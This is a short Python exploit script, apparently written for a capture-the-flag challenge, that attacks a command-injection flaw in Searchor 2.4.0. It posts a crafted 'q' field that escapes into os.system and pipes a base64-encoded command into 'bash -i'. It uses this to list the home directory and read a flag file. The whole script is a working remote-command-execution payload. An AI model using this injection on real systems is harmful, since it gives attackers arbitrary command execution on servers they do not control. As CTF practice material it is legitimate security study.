# ref. https://security.snyk.io/
# ref. https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303
# ref. https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

import requests
import base64


def exploit(cmd):
    cmd_encoded = base64.b64encode(cmd.encode()).decode()

    url = "https://c10-b6acp-1.hkcert24.pwnable.hk"
    data = {
        "e": "Google",
        "q": f"',__import__('os').system('echo {cmd_encoded}|base64 -d|bash -i')) # junky comment",
    }
    return requests.post(url, data=data).text


# hkcertuser
# print(exploit("whoami"))

print(exploit("ls -al $HOME"))
print(exploit("cat $HOME/local.txt"))
